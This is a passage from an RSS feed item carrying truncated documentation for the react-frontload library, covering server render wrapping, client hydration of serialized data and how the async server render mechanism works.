</p><p data-reactid="160">Server render</p><p data-reactid="161"><!-- react-text: 162 -->On server render, you need to wrap your existing synchronous server render code with<!-- /react-text --><!-- react-text: 163 --> <!-- /react-text --><span data-reactid="164">reactFrontloadServerRender</span><!-- react-text: 165 -->.<!-- /react-text --></p><p data-reactid="166"><!-- react-text: 167 -->You can think of this as the polyfill that allows React Frontload to load data asynchronously on server render. It just uses regular React server rendering under the hood, and its output is exactly the same. Read more about this <!-- /react-text --><a href="#how-it-works" data-reactid="168">here</a><!-- react-text: 169 -->.<!-- /react-text --></p><p><span>import</span> <span>{</span> renderToString <span>}</span> <span>from</span> <span>'react-dom/server'</span>
<span>import</span> <span>{</span> createFrontloadState<span>,</span> frontloadServerRender <span>}</span> <span>from</span> <span>'react-frontload'</span>
<span>import</span> serverApi <span>from</span> <span>'./serverApi'</span>

app<span>.</span><span>get</span><span>(</span><span>'*'</span><span>,</span> <span>async</span> <span>(</span><span>req<span>,</span> res</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>...</span>

  
  
  <span>const</span> frontloadState <span>=</span> createFrontloadState<span>.</span><span>server</span><span>(</span><span>{</span>
    
    
    
    context<span>:</span> <span>{</span> api<span>:</span> serverApi <span>}</span>
  <span>}</span><span>)</span>

  <span>try</span> <span>{</span>
    
    <span>const</span> <span>{</span> rendered<span>,</span> data <span>}</span> <span>=</span> <span>await</span> <span>frontloadServerRender</span><span>(</span><span>{</span>
      frontloadState<span>,</span>
      <span>render</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>renderToString</span><span>(</span><span>&lt;</span>App frontloadState<span>=</span><span>{</span>frontloadState<span>}</span> <span>/</span><span>&gt;</span><span>)</span>
    <span>}</span><span>)</span>

    res<span>.</span><span>send</span><span>(</span><span><span>`</span><span>
      &lt;html&gt;
        ...
        &lt;!-- server rendered markup --&gt;
        </span><span><span>${</span>rendered<span>}</span></span><span>

        &lt;!-- loaded data (to be hydrated on client) --&gt;
        &lt;script&gt;window._frontloadData=</span><span><span>${</span><span>toSanitizedJSON</span><span>(</span>data<span>)</span><span>}</span></span><span>&lt;/script&gt;
        ...
      &lt;/html&gt;
    </span><span>`</span></span><span>)</span>
  <span>}</span> <span>catch</span> <span>(</span>err<span>)</span> <span>{</span>
    
  <span>}</span>
<span>}</span><span>)</span>
</p><p data-reactid="171"><!-- react-text: 172 -->The output of<!-- /react-text --><!-- react-text: 173 --> <!-- /react-text --><span data-reactid="174">reactFrontloadServerRender</span><!-- react-text: 175 --> contains a <!-- /react-text --><span data-reactid="176">rendered</span><!-- react-text: 177 --> string, which is just the server render output to inject into your HTML template as usual.<!-- /react-text --></p><p data-reactid="178"><!-- react-text: 179 -->It also contains a <!-- /react-text --><span data-reactid="180">data</span><!-- react-text: 181 --> object, which you should serialize into your HTML as sanitised JSON.<!-- /react-text --><!-- react-text: 182 --> <!-- /react-text --><span data-reactid="183">data</span><!-- react-text: 184 --> contains all the data loaded for the current view across all components, and the purpose of this is to hydrate this data into React Frontload on the client (using<!-- /react-text --><!-- react-text: 185 --> <!-- /react-text --><span data-reactid="186">initialState</span><!-- react-text: 187 -->) so that it does not have to be reloaded on first render. This pattern is essentially the same as the one you see with other state managers such as Redux.<!-- /react-text --></p><p data-reactid="188">Client render</p><p data-reactid="189">The last remaining step is client integration, which is rather simpler. Just initialise a React Frontload state object on the client using your serialized data from server render, and pass it to the provider.</p><p><span>import</span> clientApi <span>from</span> <span>'./clientApi'</span>

<span>const</span> frontloadState <span>=</span> createFrontloadState<span>.</span><span>client</span><span>(</span><span>{</span>
  
  
  context<span>:</span> <span>{</span> api<span>:</span> clientApi <span>}</span><span>,</span>

  
  serverRenderedData<span>:</span> window<span>.</span>_frontloadData
<span>}</span><span>)</span>
<span>...</span>
ReactDOM<span>.</span><span>render</span><span>(</span><span>&lt;</span>App frontloadState<span>=</span><span>{</span>frontloadState<span>}</span> <span>/</span><span>&gt;</span><span>,</span> <span>...</span><span>)</span>
</p><p data-reactid="194">For most usecases, you don't need to care about this.</p><p data-reactid="195">That said, all abstractions are leaky at some point, and it's always useful to understand how things work under the hood so that when they behave unexpectedly, you can figure out why.</p><p data-reactid="196">The mechanism used to polyfill async on server render is deliberately very simple. As shown in the code above, React Frontload wraps ordinary synchronous server render code with an async function.</p><p data-reactid="197"><!-- react-text: 198 -->It works by running that synchronous function, and collecting the promises encountered on each render of a<!-- /react-text --><!-- react-text: 199 --> <!-- /react-text --><span data-reactid="200">useFrontload</span><!-- react-text: 201 --> hook. After the render, the collected promises are then awaited, which loads the data in those functions the same as it would be on the client. Now, React Frontload runs the server render again - this time injecting the data loaded from the previous run into each component ahead of the render. In this new render round, if no new<!-- /react-text --><!-- react-text: 202 --> <!-- /react-text --><span data-reactid="203">useFrontload</span><!-- react-text: 204 --> hooks are encountered (i.e. if there are no nested components with a<!-- /react-text --><!-- react-text: 205 --> <!-- /react-text --><span data-reactid="206">useFrontload</span><!-- react-text: 207 --> hook), then the output of this render is returned as the final output. If nested<!-- /react-text --><!-- react-text: 208 --> <!-- /react-text --><span data-reactid="209">useFrontload</span><!-- react-text: 210 --> hooks<!-- /react-text --><!-- react-text: 211 --> <!-- /react-text --><span data-reactid="212">are</span><!-- react-text: 213 --> found, the process repeats.<!-- /react-text --></p><ul id="api-useFrontload" data-reactid="225"><li data-reactid="226"><span data-reactid="227">useFrontload</span><a href="#api-useFrontload" data-reactid="228">#</a></li></ul><p data-reactid="229"><span data-reactid="230">useFrontload</span><!-- react-text: 231 --> is the React Frontload hook.<!-- /react-text --></p><p><span>import</span> <span>{</span> useFrontload <span>}</span> <span>from</span> <span>'react-frontload'</span>

<span>useFrontload</span><span>(</span>
  …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://davnicwil.com/react-frontload/">https://davnicwil.com/react-frontload/</a></em></p>]]>
            </description>
            <link>https://davnicwil.com/react-frontload/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25053845</guid>
            <pubDate>Wed, 11 Nov 2020 00:03:34 GMT</pubDate>
        </item>
    </channel>
</rss>
